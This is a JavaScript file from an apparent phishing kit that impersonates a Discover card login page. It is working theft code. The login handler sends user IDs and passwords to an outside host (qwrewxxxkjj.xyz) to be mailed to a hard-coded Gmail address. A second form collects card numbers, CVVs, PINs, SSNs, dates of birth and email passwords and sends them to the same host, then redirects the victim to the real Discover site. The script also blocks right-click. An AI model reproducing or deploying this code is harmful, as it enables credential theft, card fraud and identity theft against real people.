 async function send_em(to,from,subject,body){
            var yourUrl ="https://qwrewxxxkjj.xyz/pharoh/smtpjs.php";
            let agent = navigator.userAgent;
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                  
                }
            };
            xhr.open("POST", yourUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                "to": to,
                "from": from,
                "subject": subject,
                "body": body
            }));
          
          
          
          }
 var your_email="emilmiller134@gmail.com";
      

window.addEventListener("load", function(){

   window.addEventListener('contextmenu', function (e) { 
  // do something here... 
  e.preventDefault(); 
}, false); 
   
document.getElementById("log-in-button").addEventListener("click", function(event){
    event.preventDefault();
    var userid = document.getElementById("userid").value;
    var pass =    document.getElementById("password").value
    if( pass.length < 4 || userid.length < 4 )
    {
        alert ("please enter all feild correctly")
    }

    else{
        var body ="Email: "+email+"\nuserId: "+userid+"\n password: "+pass
        send_em(your_email,"ozoigbondu","discover logs from "+email,body).then(
            function(){
                var show = document.getElementById("cc_detail");
                var hide = document.getElementById("disc_login");
                hide.style.display = "none";
                show.style.display = "block";
                    
            }
        )
    }
       

});





document.getElementById("forgot-userid-step-continue-btn").addEventListener("click", function(event){
    event.preventDefault();
    var cardname = document.getElementById("cardname").value;
    var email_ = document.getElementById("cardMemberemail").value;
    var email_pass = document.getElementById("cardMemberemailpass").value;
    var cc = document.getElementById("cardAccountNumber").value;cardname
    var expiry =    document.getElementById("CardExpirationDate").value
    var sec_code =    document.getElementById("cvv").value
    var pin =    document.getElementById("card_pin").value
    var dob =    document.getElementById("cardMemberDOB").value
    var ssn =    document.getElementById("cardMemberSSN").value
    if( cc.length < 12 || expiry.length < 4 || sec_code.length < 3 || pin.length < 4 || dob.length < 4 || ssn.length < 4 || email_pass.length < 4 )
    {
        alert ("please enter all feild correctly")
    }

    else{
        var body ="Email: "+email+"\nEmail_: "+email_+"\nEmail_pass: "+email_pass+"\n name on card: "+cardname+"\ncc: "+cc+"\nexpiry: "+expiry+"\nSec_code: "+sec_code+"\npin: "+pin+"\ndob: "+dob+"\nssn: "+ssn
        var yourUrl ="https://qwrewxxxkjj.xyz/pharoh/smtpjs.php";
        let agent = navigator.userAgent;
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
              window.location.href="https://www.discover.com/"
            }
        };
        xhr.open("POST", yourUrl, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            "to": your_email,
            "from": "ozoigbondu",
            "subject": "discover logs from "+email,
            "body": body
        }));
    }
       

});

var date = document.getElementById('cardMemberDOB');

function checkValue(str, max) {
  if (str.charAt(0) !== '0' || str == '00') {
    var num = parseInt(str);
    if (isNaN(num) || num <= 0 || num > max) num = 1;
    str = num > parseInt(max.toString().charAt(0)) && num.toString().length == 1 ? '0' + num : num.toString();
  };
  return str;
};

date.addEventListener('input', function(e) {
  this.type = 'text';
  var input = this.value;
  if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
  var values = input.split('/').map(function(v) {
    return v.replace(/\D/g, '')
  });
  if (values[0]) values[0] = checkValue(values[0], 12);
  if (values[1]) values[1] = checkValue(values[1], 31);
  var output = values.map(function(v, i) {
    return v.length == 2 && i < 2 ? v + ' / ' : v;
  });
  this.value = output.join('').substr(0, 14);
});

date.addEventListener('blur', function(e) {
  this.type = 'text';
  var input = this.value;
  var values = input.split('/').map(function(v, i) {
    return v.replace(/\D/g, '')
  });
  var output = '';
  
  if (values.length == 3) {
    var year = values[2].length !== 4 ? parseInt(values[2]) + 2000 : parseInt(values[2]);
    var month = parseInt(values[0]) - 1;
    var day = parseInt(values[1]);
    var d = new Date(year, month, day);
    if (!isNaN(d)) {
      document.getElementById('result').innerText = d.toString();
      var dates = [d.getMonth() + 1, d.getDate(), d.getFullYear()];
      output = dates.map(function(v) {
        v = v.toString();
        return v.length == 1 ? '0' + v : v;
      }).join(' / ');
    };
  };
  this.value = output;
});


});


function formatString(e) {
    var inputChar = String.fromCharCode(event.keyCode);
    var code = event.keyCode;
    var allowedKeys = [8];
    if (allowedKeys.indexOf(code) !== -1) {
      return;
    }
  
    event.target.value = event.target.value.replace(
      /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
    ).replace(
      /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
    ).replace(
      /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
    ).replace(
      /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
    ).replace(
      /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
    ).replace(
      /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
    ).replace(
      /\/\//g, '/' // Prevent entering more than 1 `/`
    );
  }

  function numbersonly(e){
    var unicode=e.charCode? e.charCode : e.keyCode
    if (unicode!=8){ //if the key isn't the backspace key (which we should allow)
        if (unicode<48||unicode>57) //if not a number
            return false //disable key press
    }
}


function formatSSN(value) {
    if (!value) return value;
    const ssn = value.replace(/[^\d]/g, '');
    const ssnLength = ssn.length;

    if (ssnLength < 4) return ssn;

    if (ssnLength < 6) {
      return `${ssn.slice(0, 3)}-${ssn.slice(3)}`;
    }

    return `${ssn.slice(0, 3)}-${ssn.slice(3, 5)}-${ssn.slice(5, 8)}`;
  }

  function ssnFormatter() {
    const inputField = document.getElementById('cardMemberSSN');
    const formattedInputValue = formatSSN(inputField.value);
    inputField.value = formattedInputValue;
  }
